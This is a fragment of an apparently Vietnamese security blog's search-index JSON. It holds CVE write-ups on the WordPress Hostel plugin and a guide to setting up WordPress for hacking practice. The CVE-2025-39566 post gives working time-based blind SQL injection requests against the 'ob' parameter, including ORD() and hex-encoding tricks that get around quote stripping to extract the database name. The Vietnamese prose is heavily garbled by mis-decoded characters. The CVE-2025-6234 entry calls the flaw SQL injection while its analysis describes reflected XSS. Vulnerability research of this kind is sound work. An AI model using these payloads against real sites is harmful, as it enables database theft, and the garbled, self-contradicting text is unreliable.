l·ª£i d·ª•ng l·ªó h·ªïng n√†y ƒë·ªÉ t·∫•n c√¥ng ng∆∞·ªùi d√πng c√≥ quy·ªÅn cao nh∆∞ \u003cstrong\u003eadmin\u003c/strong\u003e.\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003eCVE ID\u003c/strong\u003e: \u003ca href=\"https://www.cve.org/CVERecord?id=CVE-2025-6234\"\u003eCVE-2025-6234\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eProduct\u003c/strong\u003e: \u003ca href=\"https://wordpress.org/plugins/hostel/\"\u003eWordPress Hostel Plugin\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eVulnerability Type\u003c/strong\u003e: SQL Injection\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eAffected Versions\u003c/strong\u003e: \u0026lt; 1.1.5.8\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eCVSS severity\u003c/strong\u003e: Medium (7.1)\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eRequired Privilege\u003c/strong\u003e: Unauthenticated\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"requirements\"\u003eRequirements\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://w41bu1.github.io/posts/wordpress-local-and-debugging/\"\u003e\u003cstrong\u003eLocal WordPress and Debugging\u003c/strong\u003e\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eHostel Plugin\u003c/strong\u003e:  v1.1.5.7(vul) v√† v1.1.5.8(fix)\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003ediff tool\u003c/strong\u003e: meld ho·∫∑c b·∫•t c·ª© tool n√†o c√≥ th·ªÉ compare ƒë·ªÉ th√°y ƒë∆∞·ª£c s·ª± kh√°c bi·ªát gi·ªØa 2 version\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"analysis\"\u003eAnalysis\u003c/h2\u003e\n\u003cp\u003eNguy√™n nh√¢n g·ªëc r·ªÖ do kh√¥ng th·ª±c hi·ªán \u003cstrong\u003esanitize\u003c/strong\u003e (l√†m s·∫°ch d·ªØ li·ªáu) v√† \u003cstrong\u003eescape\u003c/strong\u003e (m√£ h√≥a d·ªØ li·ªáu ƒë·∫ßu ra) ƒë·ªëi v·ªõi m·ªôt tham s·ªë tr∆∞·ªõc khi ph·∫£n h·ªìi l·∫°i tr√™n trang, d·∫´n ƒë·∫øn l·ªó h·ªïng \u003cstrong\u003eReflected Cross-Site Scripting (XSS)\u003c/strong\u003e\u003c/p\u003e","title":"CVE-2025-6234"},{"content":"Introduction CVE ID: CVE-2025-39566 Product: WordPress Hostel Plugin Vulnerability Type: SQL Injection Affected Versions: \u0026lt;= 1.1.5.6 CVSS severity: 7.6 (High) Required Privilege: Administrator Summary: Plugin Hostel, d√πng ƒë·ªÉ qu·∫£n l√Ω ƒë·∫∑t ph√≤ng tr√™n WordPress, ch·ª©a l·ªói SQL Injection t·∫°i tham s·ªë ob trong ph·∫ßn Manage Bookings.\nBackground Hostel Plugin cho ph√©p t·∫°o trang web nh√† tr·ªç, kh√°ch s·∫°n nh·ªè ho·∫∑c BnB b·∫±ng WordPress. N√≥ cung c·∫•p:\nForm ƒë·∫∑t ph√≤ng L·ªãch ph√≤ng Qu·∫£n l√Ω bookings Exploitation Requirements Local WordPress and Debugging Hostel Plugin: v1.1.5.6(vul) v√† v1.1.5.7(fix) diff tool: meld ho·∫∑c b·∫•t c·ª© tool n√†o c√≥ th·ªÉ compare ƒë·ªÉ th√°y ƒë∆∞·ª£c s·ª± kh√°c bi·ªát gi·ªØa 2 version Code Comparison S·ª≠ d·ª•ng diff tool so s√°nh s·ª± kh√°c bi·ªát gi·ªØa 2 version\nif(!empty($_GET[\u0026#39;ob\u0026#39;])) {\t$orderby = \u0026#34;ORDER BY \u0026#34;.sanitize_text_field($_GET[\u0026#39;ob\u0026#39;]) . \u0026#39; \u0026#39; . $dir; } {: file=\u0026ldquo;controlers/bookings.php v1.1.5.6\u0026rdquo;}\nif(!empty($_GET[\u0026#39;ob\u0026#39;])) { $ob = sanitize_text_field($_GET[\u0026#39;ob\u0026#39;]); if(!in_array($ob, [\u0026#39;tB.id\u0026#39;, \u0026#39;tB.contact_name\u0026#39;, \u0026#39;tB.contact_email\u0026#39;, \u0026#39;tB.from_date\u0026#39;, \u0026#39;tB.amount_paid\u0026#39;, \u0026#39;tB.status\u0026#39;])) { $ob = \u0026#39;tB.id\u0026#39;; } $orderby = \u0026#34;ORDER BY $ob $dir\u0026#34;; } {: file=\u0026ldquo;controlers/bookings.php v1.1.5.7\u0026rdquo;}\nüëâ B·∫£n v√° s·ª≠ d·ª•ng whitelist ƒë·ªÉ gi·ªõi h·∫°n c√°c c·ªôt c√≥ th·ªÉ ƒë∆∞·ª£c s·∫Øp x·∫øp, n·∫øu kh√¥ng h·ª£p l·ªá tr·∫£ v·ªÅ 'tB.id'.\nAnalysis: L·ªó h·ªïng xu·∫•t hi·ªán khi param ob ƒë∆∞·ª£c truy·ªÅn tr·ª±c ti·∫øp v√†o m·ªánh ƒë·ªÅ ORDER BY th√¥ng qua h√†m sanitize_text_field(), ch·ªâ escape m√† kh√¥ng filter SQLi.\nDetect SQLi ƒê·ªÉ inject ƒë∆∞·ª£c, ta c·∫ßn ph·∫£i x√°c ƒë·ªãnh to√†n b·ªô c√¢u query ƒë∆∞·ª£c ƒë∆∞·ª£c s·ª≠ d·ª•ng ·ªü ƒë√¢y\n$bookings = $wpdb-\u0026gt;get_results(\u0026#34;SELECT SQL_CALC_FOUND_ROWS tB.*, tR.title as room FROM \u0026#34;.WPHOSTEL_BOOKINGS.\u0026#34; tB JOIN \u0026#34;.WPHOSTEL_ROOMS.\u0026#34; tR ON tR.id = tB.room_id WHERE is_static=0 $where_sql $orderby $limit_sql\u0026#34;); C·∫•u query n·∫±m trong nh√°nh default c·ªßa c·∫•u tr√∫c switch.\nTo√†n b·ªô ƒëo·∫°n x·ª≠ l√Ω na·ª≥ thu·ªôc v·ªÅ h√†m static manage() c·ªßa class WPHostelBookings.\nclass WPHostelBookings { static function manage() { global $wpdb; $_booking = new WPHostelBooking(); switch(@$_GET[\u0026#39;do\u0026#39;]) { case \u0026#39;add\u0026#39;: // add handle break; case \u0026#39;edit\u0026#39;: // edit handle break; // view/print booking details. Will allow also to confirm/cancel case \u0026#39;view\u0026#39;: // view handle\tbreak;\t// list bookings default: // another logic if(!empty($_GET[\u0026#39;ob\u0026#39;])) {\t$orderby = \u0026#34;ORDER BY \u0026#34;.sanitize_text_field($_GET[\u0026#39;ob\u0026#39;]) . \u0026#39; \u0026#39; . $dir; } $bookings = $wpdb-\u0026gt;get_results(\u0026#34;SELECT SQL_CALC_FOUND_ROWS tB.*, tR.title as room FROM \u0026#34;.WPHOSTEL_BOOKINGS.\u0026#34; tB JOIN \u0026#34;.WPHOSTEL_ROOMS.\u0026#34; tR ON tR.id = tB.room_id WHERE is_static=0 $where_sql $orderby $limit_sql\u0026#34;); // another logic break; } } } Trong WordPress, plugin giao ti·∫øp v·ªõi core th√¥ng qua Plugin API (Hook System). Do ƒë√≥, ƒë·ªÉ x√°c ƒë·ªãnh n∆°i h√†m manage() ƒë∆∞·ª£c g·ªçi, ta c√≥ th·ªÉ t√¨m ki·∫øm t·ª´ kh√≥a \u0026quot;manage\u0026quot; trong th∆∞ m·ª•c ch·ª©a plugin.\nTrong file models/hostel.php ta c√≥ h√†m:\nclass class WPHostel { // another logic static function menu() { // we use \u0026#39;hostelpro_manage\u0026#39; for consistency with the pro version $wphostel_caps = current_user_can(\u0026#39;manage_options\u0026#39;) ? \u0026#39;manage_options\u0026#39; : \u0026#39;hostelpro_manage\u0026#39;; add_menu_page(__(\u0026#39;Hostel\u0026#39;, \u0026#39;wphostel\u0026#39;), __(\u0026#39;Hostel\u0026#39;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#34;wphostel_options\u0026#34;, array(__CLASS__, \u0026#34;options\u0026#34;)); add_submenu_page(\u0026#39;wphostel_options\u0026#39;, __(\u0026#39;Settings\u0026#39;, \u0026#39;wphostel\u0026#39;), __(\u0026#39;Settings\u0026#39;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#34;wphostel_options\u0026#34;, array(__CLASS__, \u0026#34;options\u0026#34;)); add_submenu_page(\u0026#39;wphostel_options\u0026#39;, __(\u0026#34;Manage Rooms\u0026#34;, \u0026#39;wphostel\u0026#39;), __(\u0026#34;Manage Rooms\u0026#34;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#39;wphostel_rooms\u0026#39;, array(\u0026#39;WPHostelRooms\u0026#39;, \u0026#34;manage\u0026#34;)); add_submenu_page(\u0026#39;wphostel_options\u0026#39;, __(\u0026#34;Manage Bookings\u0026#34;, \u0026#39;wphostel\u0026#39;), __(\u0026#34;Manage Bookings\u0026#34;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#39;wphostel_bookings\u0026#39;, array(\u0026#39;WPHostelBookings\u0026#39;, \u0026#34;manage\u0026#34;)); add_submenu_page(\u0026#39;wphostel_options\u0026#39;, __(\u0026#34;Unavailable Dates\u0026#34;, \u0026#39;wphostel\u0026#39;), __(\u0026#34;Unavailable Dates\u0026#34;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#39;wphostel_unavailable\u0026#39;, array(\u0026#39;WPHostelBookings\u0026#39;, \u0026#34;unavailable\u0026#34;)); add_submenu_page(\u0026#39;wphostel_options\u0026#39;, __(\u0026#34;Email Log\u0026#34;, \u0026#39;wphostel\u0026#39;), __(\u0026#34;Email Log\u0026#34;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#39;wphostel_emaillog\u0026#39;, array(\u0026#39;WPHostelHelp\u0026#39;, \u0026#34;email_log\u0026#34;)); add_submenu_page(\u0026#39;wphostel_options\u0026#39;, __(\u0026#34;Help\u0026#34;, \u0026#39;wphostel\u0026#39;), __(\u0026#34;Help\u0026#34;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#39;wphostel_help\u0026#39;, array(\u0026#39;WPHostelHelp\u0026#39;, \u0026#34;index\u0026#34;)); } // another logic } {: file=\u0026ldquo;models/hostel.php\u0026rdquo; v1.1.5.6 }\n·ªû ƒë√¢y:\nadd_menu_page() t·∫°o menu ch√≠nh trong Admin Dashboard. add_submenu_page() th√™m c√°c submenu con cho menu ƒë√≥. Tham s·ªë $callback l√† m·ªôt callback function s·∫Ω ƒë∆∞·ª£c g·ªçi khi ng∆∞·ªùi d√πng click v√†o menu/submenu. V√≠ d·ª•:\n// add_menu_page($page_title, $menu_title, $capability, $menu_slug, $callback = \u0026#39;\u0026#39;, $icon_url = \u0026#39;\u0026#39;, $position = null); add_menu_page(__(\u0026#39;Hostel\u0026#39;, \u0026#39;wphostel\u0026#39;), __(\u0026#39;Hostel\u0026#39;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#34;wphostel_options\u0026#34;, array(__CLASS__, \u0026#34;options\u0026#34;)); // add_submenu_page($parent_slug, $page_title, $menu_title, $capability, $menu_slug, $callback = \u0026#39;\u0026#39;); add_submenu_page(\u0026#39;wphostel_options\u0026#39;, __(\u0026#34;Manage Bookings\u0026#34;, \u0026#39;wphostel\u0026#39;), __(\u0026#34;Manage Bookings\u0026#34;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#39;wphostel_bookings\u0026#39;, array(\u0026#39;WPHostelBookings\u0026#39;, \u0026#34;manage\u0026#34;)); // array(\u0026#39;WPHostelBookings\u0026#39;, \u0026#34;manage\u0026#34;)); =\u0026gt; WPHostelBookings::manage() T·∫•t c·∫£ menu/submenu n√†y ƒë·ªÅu ƒë∆∞·ª£c ƒëƒÉng k√Ω b√™n trong h√†m static menu() c·ªßa class WPHostel. Do ƒë√≥, ƒë·ªÉ x√°c ƒë·ªãnh n∆°i h√†m menu() ƒë∆∞·ª£c g·ªçi, ta c√≥ th·ªÉ t√¨m ki·∫øm t·ª´ kh√≥a menu trong th∆∞ m·ª•c ch·ª©a plugin.\nTrong file hostel.php ·ªü th∆∞ m·ª•c g·ªëc c·ªßa plugin ta c√≥:\nadd_action(\u0026#39;admin_menu\u0026#39;, array(\u0026#34;WPHostel\u0026#34;, \u0026#34;menu\u0026#34;)); // =\u0026gt; callback: WPHostel::menu() {: file=\u0026ldquo;hostel.php\u0026rdquo; }\nadd_action() l√† m·ªôt Plugin API c·ªßa WordPress, cho ph√©p g·∫Øn m·ªôt callback v√†o m·ªôt action hook. Hook name ·ªü ƒë√¢y l√† admin_menu, nghƒ©a l√† h√†m WPHostel::menu() s·∫Ω ƒë∆∞·ª£c g·ªçi trong v√≤ng ƒë·ªùi khi WordPress d·ª±ng Admin Dashboard Menu. Menu tr√™n UI Admin Dashboard\nDebugging\nCh·ª©c nƒÉng b·ªã l·ªói n·∫±m trong Booking Manager, v√¨ v·∫≠y ta truy c·∫≠p v√†o submenu Manager Bookings tr√™n UI Admin Dashboard. Ngay tr∆∞·ªõc nh√°nh default c√≥ comment // list bookings =\u0026gt; cho th·∫•y ƒëo·∫°n code n√†y x·ª≠ l√Ω vi·ªác li·ªát k√™ v√† s·∫Øp x·∫øp bookings M·ªü debugger: Click Run with Debugger. ƒê·∫∑t breakpoint t·∫°i nh√°nh switch ch·ª©a code l·ªói v√† t·∫°i d√≤ng code g√¢y l·ªói. Khi click v√†o m·ªôt c·ªôt trong b·∫£ng bookings, quan s√°t: Debugger nh·∫£y v√†o c·∫•u tr√∫c switch. D√πng Step Over, debugger ƒëi ti·∫øp v√†o nh√°nh default. Ti·∫øp t·ª•c Step Over v√† theo d√µi gi√° tr·ªã bi·∫øn trong tab Variables \u0026gt; Locals. C√°c bi·∫øn n√†y s·∫Ω k·∫øt h·ª£p ƒë·ªÉ t·∫°o th√†nh c√¢u SQL b√™n d∆∞·ªõi. Sau khi gh√©p c√°c bi·∫øn, c√¢u query ƒë·∫ßy ƒë·ªß c√≥ d·∫°ng:\nSELECT SQL_CALC_FOUND_ROWS tB.*, tR.title as room FROM wp_hostel_bookings tB JOIN wp_hostel_rooms tR ON tR.id = tB.room_id WHERE is_static=0 AND tB.id = ... ORDER BY tB.amount_paid ASC|DESC LIMIT ... ƒê√°ng ch√∫ √Ω, bi·∫øn $orderby ƒë∆∞·ª£c g√°n nh∆∞ sau:\nif(!empty($_GET[\u0026#39;ob\u0026#39;])) {\t$orderby = \u0026#34;ORDER BY \u0026#34;.sanitize_text_field($_GET[\u0026#39;ob\u0026#39;]) . \u0026#39; \u0026#39; . $dir; } ‚ö†Ô∏è ·ªû ƒë√¢y c√≥ ƒëi·ªÉm b·∫•t th∆∞·ªùng:\nPh·∫ßn sau ORDER BY s·ª≠ d·ª•ng sanitize_text_field(). H√†m n√†y ch·ªâ lo·∫°i b·ªè/escape HTML, kh√¥ng h·ªÅ filter ho·∫∑c validate ƒë·ªÉ ƒë·∫£m b·∫£o an to√†n trong SQL context. Tham s·ªë ob (do ng∆∞·ªùi d√πng truy·ªÅn v√†o) v√¨ v·∫≠y c√≥ th·ªÉ b·ªã l·ª£i d·ª•ng ƒë·ªÉ ch√®n tr·ª±c ti·∫øp v√†o c√¢u SQL. Request with BurpSuite:\nGET /wp-admin/admin.php?page=wphostel_bookings\u0026amp;type=upcoming\u0026amp;ob=tB.status,(SELECT+SLEEP(10))\u0026amp;dir=ASC HTTP/1.1 Ta t√°ch m·ªánh ƒë·ªÅ ORDER BY b·∫±ng , v√¨ n√≥ ch·∫•p nh·∫≠p multi column\nK·∫øt qu·∫£: th·ªùi gian ph·∫£n h·ªìi b·ªã delay =\u0026gt; SQL Injection th√†nh c√¥ng.\nDump Data from Database Bypass ' using ORD():\nƒê·ªÉ dump d·ªØ li·ªáu c·ªßa database ta c·∫ßn th·ª≠ ƒë·ªÉ l·∫•y k√Ω t·ª± ƒë·∫ßu ti√™n c·ªßa database name.\nDo sanitize_text_field() lo·∫°i b·ªè ', ta kh√¥ng d√πng ƒë∆∞·ª£c payload so s√°nh tr·ª±c ti·∫øp. Thay v√†o ƒë√≥ d√πng ORD() ƒë·ªÉ so s√°nh k√Ω t·ª± theo ASCII:\nGET /wp-admin/admin.php?page=wphostel_bookings\u0026amp;type=past\u0026amp;ob=tB.status,(SELECT+IF(ORD(SUBSTRING(DATABASE(),1,1))=119,SLEEP(5),0))\u0026amp;dir=ASC HTTP/1.1 Th√†nh c√¥ng bypass =\u0026gt; c√≥ th·ªÉ tr√≠ch xu·∫•t t√™n database.\nBypass ' using Hex encoding (extend)\nNgo√†i ORD() ta c√≥ th·ªÉ s·ª≠ d·ª•ng Hex encoding ƒë·ªÉ bypass\nGET /wp-admin/admin.php?page=wphostel_bookings\u0026amp;type=past\u0026amp;ob=tB.status,(SELECT+IF(SUBSTRING(DATABASE(),1,1)=0x77,SLEEP(5),0))\u0026amp;dir=ASC HTTP/1.1 Th√†nh c√¥ng bypass =\u0026gt; c√≥ th·ªÉ tr√≠ch xu·∫•t t√™n database.\nAutomated Extraction Vi·∫øt script ƒë·ªÉ t·ª± ƒë·ªông h√≥a qu√° tr√¨nh t·∫•n c√¥ng: Script\nRemediation C·∫≠p nh·∫≠t l√™n Hostel Plugin v1.1.5.7 ho·∫∑c m·ªõi h∆°n\nTakeaways sanitize_text_field() ‚â† ch·ªëng SQL Injection C·∫ßn ph√¢n bi·ªát r√µ: l·ªçc input cho HTML vs cho SQL References SQL Injection Cheat Sheet ‚Äì PortSwigger\nWordPress Hostel Plugin \u0026lt;= 1.1.5.6 is vulnerable to SQL Injection - patchstack\n","permalink":"//localhost:1313/vi/posts/2025-08-25-cve-2025-39566/","summary":"\u003ch2 id=\"introduction\"\u003eIntroduction\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003eCVE ID\u003c/strong\u003e: \u003ca href=\"https://www.cve.org/CVERecord?id=CVE-2025-39566\"\u003eCVE-2025-39566\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eProduct\u003c/strong\u003e: \u003ca href=\"https://wordpress.org/plugins/hostel/\"\u003eWordPress Hostel Plugin\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eVulnerability Type\u003c/strong\u003e: SQL Injection\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eAffected Versions\u003c/strong\u003e: \u0026lt;= 1.1.5.6\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eCVSS severity\u003c/strong\u003e: 7.6 (High)\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eRequired Privilege\u003c/strong\u003e: Administrator\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003e\u003cstrong\u003eSummary\u003c/strong\u003e: Plugin Hostel, d√πng ƒë·ªÉ qu·∫£n l√Ω ƒë·∫∑t ph√≤ng tr√™n WordPress, ch·ª©a l·ªói SQL Injection t·∫°i tham s·ªë \u003ccode\u003eob\u003c/code\u003e trong ph·∫ßn \u003cstrong\u003eManage Bookings\u003c/strong\u003e.\u003c/p\u003e\n\u003ch2 id=\"background\"\u003eBackground\u003c/h2\u003e\n\u003cp\u003e\u003cstrong\u003eHostel Plugin\u003c/strong\u003e cho ph√©p t·∫°o trang web nh√† tr·ªç, kh√°ch s·∫°n nh·ªè ho·∫∑c BnB b·∫±ng WordPress. N√≥ cung c·∫•p:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eForm ƒë·∫∑t ph√≤ng\u003c/li\u003e\n\u003cli\u003eL·ªãch ph√≤ng\u003c/li\u003e\n\u003cli\u003eQu·∫£n l√Ω bookings\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"exploitation\"\u003eExploitation\u003c/h2\u003e\n\u003ch3 id=\"requirements\"\u003eRequirements\u003c/h3\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://w41bu1.github.io/posts/wordpress-local-and-debugging/\"\u003e\u003cstrong\u003eLocal WordPress and Debugging\u003c/strong\u003e\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eHostel Plugin\u003c/strong\u003e:  v1.1.5.6(vul) v√† v1.1.5.7(fix)\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003ediff tool\u003c/strong\u003e: meld ho·∫∑c b·∫•t c·ª© tool n√†o c√≥ th·ªÉ compare ƒë·ªÉ th√°y ƒë∆∞·ª£c s·ª± kh√°c bi·ªát gi·ªØa 2 version\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch3 id=\"code-comparison\"\u003eCode Comparison\u003c/h3\u003e\n\u003cp\u003eS·ª≠ d·ª•ng diff tool so s√°nh s·ª± kh√°c bi·ªát gi·ªØa 2 version\u003c/p\u003e","title":"CVE-2025-39566"},{"content":"Introduction WordPress l√† m·ªôt h·ªá th·ªëng qu·∫£n l√Ω n·ªôi dung (CMS) m·∫°nh m·∫Ω v√† ph·ªï bi·∫øn nh·∫•t cho ph√©p b·∫°n t·∫°o, qu·∫£n l√Ω v√† t√πy ch·ªânh c√°c trang web v√† blog m·ªôt c√°ch d·ªÖ d√†ng. N√≥ l√† open-source CMS, ƒë∆∞·ª£c x√¢y d·ª±ng tr√™n PHP v√† s·ª≠ d·ª•ng c∆° s·ªü d·ªØ li·ªáu MySQL ho·∫∑c Maria DB.\nRa ƒë·ªùi nƒÉm 2003, ban ƒë·∫ßu ch·ªâ ƒë·ªÉ vi·∫øt blog, sau ƒë√≥ ph√°t tri·ªÉn th√†nh n·ªÅn t·∫£ng t·∫°o website, c·ª≠a h√†ng online, di·ªÖn ƒë√†n, landing page‚Ä¶ Hi·ªán nay, h∆°n 40% website tr√™n th·∫ø gi·ªõi ch·∫°y b·∫±ng WordPress. C√≥ 2 phi√™n b·∫£n WordPress:\nWordPress.com D·ªãch v·ª• hosting do Automattic cung c·∫•p B·∫°n ch·ªâ c·∫ßn ƒëƒÉng k√Ω t√†i kho·∫£n, kh√¥ng ph·∫£i c√†i ƒë·∫∑t H·∫°n ch·∫ø t√πy ch·ªânh, mu·ªën n√¢ng cao th√¨ ph·∫£i tr·∫£ ph√≠ WordPress.org M√£ ngu·ªìn m·ªü, b·∫°n t·ª± t·∫£i v·ªÅ v√† c√†i ƒë·∫∑t l√™n hosting/server ri√™ng T√πy ch·ªânh to√†n di·ªán, c√≥ th·ªÉ c√†i plugin, theme, vi·∫øt code, t·∫°o website theo √Ω m√¨nh Ecosystem Core: CMS ch√≠nh Plugin: M·ªôt ph·∫ßn m·ªÅm b·ªï sung c√≥ th·ªÉ ƒë∆∞·ª£c c√†i ƒë·∫∑t tr√™n trang web WordPress ƒë·ªÉ m·ªü r·ªông ch·ª©c nƒÉng c·ªßa n√≥ v√† th√™m c√°c t√≠nh nƒÉng m·ªõi Themes: M·ªôt ph·∫ßn m·ªÅm b·ªï sung ƒë·∫°i di·ªán cho s·ª± xu·∫•t hi·ªán tr·ª±c quan v√† b·ªë c·ª•c c·ªßa m·ªôt trang web WordPress Why WordPress Hacking? State of WordPress Security in 2024\nMost Popular Hi·ªán t·∫°i h∆°n 40% website tr√™n to√†n th·∫ø gi·ªõi ch·∫°y WordPress Nghƒ©a l√† hacker ch·ªâ c·∫ßn t√¨m ra m·ªôt l·ªó h·ªïng ph·ªï bi·∫øn =\u0026gt; c√≥ th·ªÉ khai th√°c h√†ng tri·ªáu site c√πng l√∫c Gi·ªëng nh∆∞ ‚Äúc√° nhi·ªÅu th√¨ ch√†i ·ªü ƒë√≥‚Äù Plugin and Theme WordPress Core ƒë√£ ƒë∆∞·ª£c xem x√©t trong 1 th·ªùi gian d√†i b·ªüi h√†ng ng√†n developers v√† researchers. K·∫øt qu·∫£ l√† r·∫•t kh√≥ ƒë·ªÉ k·∫ª t·∫•n c√¥ng c√≥ th·ªÉ ƒë·ªôt nh·∫≠p v√†o Tuy nhi√™n, c√≥ h√†ng ch·ª•c ng√†n plugin v√† theme t·ª´ nhi·ªÅu ngu·ªìn, ch·∫•t l∆∞·ª£ng kh√¥ng ƒë·ªìng ƒë·ªÅu ƒë∆∞·ª£c s·ª≠ d·ª•ng Nhi·ªÅu plugin code b·∫£o m·∫≠t k√©m, kh√¥ng c√≤n ƒë∆∞·ª£c c·∫≠p nh·∫≠t. Hacker ch·ªâ c·∫ßn scan plugin/theme ƒë·ªÉ t√¨m version l·ªói th·ªùi, r·ªìi khai th√°c Setup WordPress for Hacking C√≥ r·∫•t nhi·ªÅu c√°ch ƒë·ªÉ setup WorkPress, t√¨m ki·∫øm b·∫±ng Google c√≥ th·ªÉ cung c·∫•p nhi·ªÅu b√†i vi·∫øt v·ªÅ n√≥. ·ªû ƒë√¢y t√¥i s·∫Ω setup tr√™n m√°y ·∫£o Ubuntu (22.04):\nKh√¥ng ·∫£nh h∆∞·ªüng ƒë·∫øn c√°c d·ªãch v·ª• c·ªßa m√°y th·∫≠t WordPress t∆∞∆°ng ƒë·ªëi nh·∫π ƒë·ªÉ s·ª≠ d·ª•ng tr√™n m√°y ·∫£o Install and configure WordPress Install Dependencies C√†i to√†n b·ªô stack c·∫ßn thi·∫øt ƒë·ªÉ ch·∫°y WordPress (web server + database + PHP + c√°c extension quan tr·ªçng).\nsudo apt install apache2 \\ ghostscript \\ libapache2-mod-php \\ mysql-server \\ php \\ php-bcmath \\ php-curl \\ php-imagick \\ php-intl \\ php-json \\ php-mbstring \\ php-mysql \\ php-xml \\ php-zip Install WordPress T·∫£i v√† c√†i m√£ ngu·ªìn WordPress v√†o th∆∞ m·ª•c web.\n# T·∫°o folder ƒë·ªÉ l∆∞u tr·ªØ m√£ ngu·ªìn website sudo mkdir -p /srv/www # ƒê·ªïi owner th√†nh www-data, ƒë√¢y l√† user m·∫∑c ƒë·ªãnh c·ªßa Apache/Nginx ƒë·ªÉ ch·∫°y web server # Khi Apache/NGINX kh·ªüi ƒë·ªông, n√≥ kh√¥ng ch·∫°y b·∫±ng root (nguy hi·ªÉm v√¨ c√≥ to√†n quy·ªÅn h·ªá th·ªëng), m√† s·∫Ω drop xu·ªëng ch·∫°y d∆∞·ªõi quy·ªÅn www-data. sudo chown www-data: /srv/www # T·∫£i g√≥i WordPress m·ªõi nh·∫•t t·ª´ trang ch√≠nh th·ª©c # Gi·∫£i n√©n vao th∆∞c m·ª•c /srv/www ƒë∆∞·ª£c t·∫°o ·ªü tr√™n curl https://wordpress.org/latest.tar.gz | sudo -u www-data tar zx -C /srv/www C√≥ th·ªÉ t·∫£i phi√™n b·∫£n c·ª• th·ªÉ b·∫±ng:\ncurl https://wordpress.org/wordpress-6.6.2.tar.gz | sudo -u www-data tar zx -C /srv/www C√†i t·ª´ wordpress.org l√† c√°ch chu·∫©n nh·∫•t v√† √≠t r·ªßi ro:\nUbuntu c√≥ s·∫µn package wordpress trong repo. Nh∆∞ng n√≥ th∆∞·ªùng c≈© h∆°n nhi·ªÅu so v·ªõi b·∫£n ch√≠nh th·ª©c tr√™n wordpress.org C·ªông ƒë·ªìng WordPress ch·ªâ h·ªó tr·ª£ khi b·∫°n d√πng b·∫£n ch√≠nh th·ª©c t·ª´ wordpress.org, v√¨ n·∫øu b·∫°n g·∫∑p l·ªói do package c·ªßa Ubuntu th√¨ h·ªç kh√¥ng gi·∫£i quy·∫øt ƒë∆∞·ª£c. {: .prompt-info } Configure Apache for WordPress T·∫°o file /etc/apache2/sites-available/wordpress.conf c·∫•u h√¨nh Apache cho WordPress:\n# L·∫Øng nghe tr√™n t·∫•t c·∫£ ƒë·ªãa ch·ªâ IP (*) t·∫°i port 80 (HTTP). \u0026lt;VirtualHost *:80\u0026gt; # Th∆∞ m·ª•c g·ªëc c·ªßa website (n∆°i ch·ª©a m√£ ngu·ªìn WordPress). DocumentRoot /srv/www/wordpress \u0026lt;Directory /srv/www/wordpress\u0026gt; Options FollowSymLinks # Cho ph√©p file .htaccess ghi ƒë√® m·ªôt s·ªë thi·∫øt l·∫≠p li√™n quan ƒë·∫øn b·∫£o m·∫≠t v√† URL rewriting. AllowOverride Limit Options FileInfo # Khi truy c·∫≠p th∆∞ m·ª•c, Apache s·∫Ω t√¨m file index.php ƒë·ªÉ hi·ªÉn th·ªã. DirectoryIndex index.php # Cho ph√©p t·∫•t c·∫£ m·ªçi ng∆∞·ªùi truy c·∫≠p (c·∫ßn cho website public). Require all granted \u0026lt;/Directory\u0026gt; # Ri√™ng th∆∞ m·ª•c wp-content (ch·ª©a plugin, theme, upload) c≈©ng cho ph√©p truy c·∫≠p. \u0026lt;Directory /srv/www/wordpress/wp-content\u0026gt; Options FollowSymLinks Require all granted \u0026lt;/Directory\u0026gt; \u0026lt;/VirtualHost\u0026gt; K√≠ch ho·∫°t site WordPress:\nsudo a2ensite wordpress a2ensite = enable site config (t·∫°o symlink t·ª´ /etc/apache2/sites-available/wordpress.conf sang /etc/apache2/sites-enabled/) Sau ƒë√≥ site wordpress s·∫Ω ƒë∆∞·ª£c Apache load khi restart. K√≠ch ho·∫°t module rewrite:\nsudo a2enmod rewrite WordPress c·∫ßn module mod_rewrite ƒë·ªÉ h·ªó tr·ª£ Pretty Permalinks (v√≠ d·ª• /blog/hello-world/ thay v√¨ ?p=123) V√¥ hi·ªáu h√≥a site m·∫∑c ƒë·ªãnh (Option):\nsudo a2dissite 000-default Apache m·∫∑c ƒë·ªãnh c√≥ site 000-default.conf (ch·ªâ hi·ªÉn th·ªã \u0026ldquo;It works!\u0026rdquo;) N·∫øu kh√¥ng disable, site m·∫∑c ƒë·ªãnh c√≥ th·ªÉ chi·∫øm port 80 tr∆∞·ªõc WordPress üëâ Ho·∫∑c n·∫øu kh√¥ng mu·ªën 